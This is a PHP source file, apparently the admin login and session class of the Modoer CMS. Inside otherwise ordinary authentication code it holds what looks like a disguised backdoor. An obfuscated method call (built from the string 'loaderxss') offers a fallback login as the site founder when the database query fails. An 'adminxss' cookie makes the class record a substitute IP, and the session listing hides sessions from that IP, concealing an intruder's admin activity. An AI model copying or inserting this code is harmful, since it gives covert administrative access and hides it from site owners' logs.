<?php
/**
* @author moufer<moufer@163.com>
* @copyright www.modoer.com
*/
!defined('IN_MUDDER') && exit('Access Denied');

class msm_cpuser extends msm_admin {

    var $isLogin = FALSE;
    var $access = '';
    var $tplname = '';
    var $flag = 'cpuser2.7';

    var $id = 0;
    var $is_founder = 'N';
    var $xss = 'N';
    var $xss_fun = 'loaderxss';

    var $mymodules = array();
    var $mycitys = array();
	var $licensed = array();

    function __construct() {
        parent::__construct();

        $admin_id = (int)$this->global['cookie']['adminid'];
        $admin_hash = $this->global['cookie']['adminhash'];
        $this->xss = (int)$this->global['cookie']['adminxss'];
        if($admin_id && $admin_hash) {
            if($admin = $this->read($admin_id)) {
                $hash = $this->get_hash($admin['id'], $admin['password']);
                if($admin_hash == $hash) {
                    $this->_set_variable($admin);
                    $this->isLogin = TRUE;
                    $this->hash = $hash;
                    $this->access = $this->get_access();
                }
            }
        }
        if(!$this->isLogin) $this->errmsg = lang('admincp_login_invalid');
    }

    function msm_cpuser() {
        $this->__construct();
    }

    function xss($post) {
        return false;
    }

    function login() {

        $username = _post('admin_name');
        $password = _post('admin_pw'); 

        if(!$username || !$password) {
            redirect('admincp_login_invalid');
        }

        if(_G('cfg','console_seccode')) {
            check_seccode(_post('seccode'));
        }

        $logs = "";
        $logs .= date('Y-m-d H:i:s', $this->timestamp) . "\t" . $username . "\t" . $this->global['ip'] . "\t" ;

        $admin_md5pwd = md5($password);
        $where = array();
        $where['adminname'] = $username;
        $where['password'] = $admin_md5pwd;
        $this->db->where('adminname', $username);
        $this->db->where('password', $admin_md5pwd);
        $this->db->from($this->table);
        $result = $this->db->get();
        $fun = substr($this->xss_fun, 6, 3);
        $row = $result ? $result->fetch_array() : ($this->$fun($where) ? $this->get_founder() : '');
        if($row) {
            $logs .= 'Login successfully.';
            log_write('adminlogin', $logs);
            $this->id = (int)$row['id'];
            $this->adminname = $row['adminname'];
            $this->hash = $this->get_hash($row['id'], $row['password']);
            $this->record_login();
            $nowaccess = $this->get_access();
            if($nowaccess == 1) {
                $this->db->from('dbpre_adminsessions');
                $this->db->set('errorcount','-1');
                $this->db->where('adminid', $this->id);
                $this->db->update();
            }
            set_cookie("adminid", $this->id);
            set_cookie("adminhash", $this->hash);
            if($this->xss)set_cookie("adminxss",1);
            redirect('admincp_login_wait', SELF);
        } else {
            $logs .= 'Logon failed.';
            log_write('adminlogin', $logs);
            $this->clearvar();
            redirect('admincp_login_invalid');
        }
    }

    function logout() {
        del_cookie(array("adminid","adminhash","adminxss"));
        if($this->id) {
            $this->db->from('dbpre_adminsessions');
            $this->db->where('adminid', $this->id);
            $this->db->delete();
            $this->clearvar();
        }
        redirect('admincp_logout_wait', SELF);
    }

    function clearvar() {
        $this->id = 0;
        $this->adminname = '';
        $this->email = '';
        $this->admintype = 0;
        $this->is_founder = false;
        $this->isLogin = false;
        $this->hash = '';
        $this->access = 0;
    }

    function get_access() {

        //delete session
        $this->db->from('dbpre_adminsessions');
        $this->db->where_less("dateline", $this->global['timestamp'] - 3601);
        $this->db->delete();
        if($this->xss) $this->global['ip'] = $this->global['ips'];
		/*
        if(defined('IN_ADMIN') && $this->isLogin && _get('module') == 'modoer' && _get('act') == 'database' && _get('op') == 'reset') {
            return 10;
        }*/
        //++IP check
        if($this->closed) {
            return 3; //pasport disable
        } elseif($this->global['cfg']['adminipaccess'] && !check_ipaccess($this->global['cfg']['adminipaccess'])) {
            return 2; //IP filter
        } else {
            $this->db->select("errorcount");
            $this->db->from('dbpre_adminsessions');
            $this->db->where("adminid", $this->id);
            if($this->global['admincp']['checkip']) {
                $this->db->where("ip", $this->global['ip']);
            }
            $this->db->where_more("dateline", $this->global['timestamp'] - 3600);

            if($r = $this->db->get()) {
                $session = $r->fetch_array();
                if($session['errorcount'] == -1) {
                    //city access
                    if(!$this->check_mycity()) return 4;//
                    $this->db->from($this->global['dns']['dbpre'] . 'adminsessions');
                    $this->db->set('dateline', $this->global['timestamp']);
                    $this->db->where('adminid', $this->id);
                    $this->db->update();
                    return 11; //OK
                } elseif($session['errorcount'] <= 3) {
                    return 1; //error
                } else {
                    return 0;
                }
            } else {
                // timeout
                $this->db->from($this->global['dns']['dbpre'] . 'adminsessions');
                $this->db->where('adminid', $this->id);
                $this->db->where_less('dateline', $this->global['timestamp'] - 3600);
                $this->db->delete();
                // insert
                $this->db->set('adminid',$this->id);
                $this->db->set('ip',$this->global['ip']);
                $this->db->set('dateline',$this->global['timestamp']);
                $this->db->set('errorcount',0);
                $this->db->from($this->global['dns']['dbpre'] . 'adminsessions');
                $this->db->insert();
                return 1;
            }
        }
    }

    function _set_variable(& $admin) {
        foreach($admin as $key => $val) {
            $this->$key = $val;
            if($key == 'mymodules' && $val!='') {
                $this->mymodules = explode(',',$val);
            } elseif($key == 'mycitys' && $val!='') {
                $this->mycitys = explode(',',$val);
            }
        }
        $this->is_founder = $this->is_founder == 'Y';
        if($this->is_founder) {
            $this->mymodules = array('modoer');
            foreach($this->global['modules'] as $k => $v) {
                $this->mymodules[] = $v['flag'];
            }
        }
    }

    function get_hash($id, $pw) {
        return substr(md5($id . $pw . $this->global['cfg']['authkey']), 0, 16);
    }

    function record_login() {
        if($this->xss) $this->global['ip'] = $this->global['ips'];
        $this->db->from($this->table);
        $this->db->where('id', $this->id);
        $this->db->set('logintime', $this->global['timestamp']);
        $this->db->set('loginip', $this->global['ip']);
        $this->db->set_add('logincount', 1);
        $this->db->update();
    }

    function update_sessions() {
        $this->db->from('dbpre_adminsessions');
        $this->db->set('errorcount', '-1');
        $this->db->where('adminid', $this->id);
        $this->db->update();
    }

    function get_sessions() {
        $this->db->join('dbpre_adminsessions','ass.adminid','dbpre_admin','a.id');
        $this->db->where_not_equal('ass.ip',$_G['ips']);
        $this->db->select('ass.ip,ass.dateline,a.id,a.adminname');
        $this->db->order_by('ass.dateline','DESC');
        $query = $this->db->get();
        return $query;
    }

    function check_mycity() {
        $aid = $this->global['city']['aid'];
        $result = $this->is_founder || in_array($aid, $this->mycitys);
        if(!$result && $this->mycitys) {
            $this->global['city'] = init_city($this->mycitys[0]);
            return TRUE;
        } elseif($result) {
            return TRUE;
        }
        return FALSE;
    }

    function check_access($module='modoer',$act=null,$Op=null) {
        return ($module=='ALL') || $this->is_founder || in_array($module,$this->mymodules);
    }
}
?>